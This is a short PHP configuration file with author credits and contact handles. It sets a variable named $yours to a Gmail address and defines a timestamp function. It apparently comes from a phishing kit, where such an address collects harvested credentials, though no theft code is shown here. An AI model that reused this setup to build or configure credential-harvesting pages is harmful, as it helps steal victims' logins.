<?php
	/*
	/ -> All Created By AdEm AouFi
	/ -> https://www.facebook.com/ad.emaoufi.524
	/ -> ICQ : 746200545
	*/
	

	// ================================= //

	$yours = "seliaxishigh@gmail.com";
	// ================================= //


	function now() {
		date_default_timezone_set('GMT');
		return date("d/m/Y h:i:sa");
	}

?>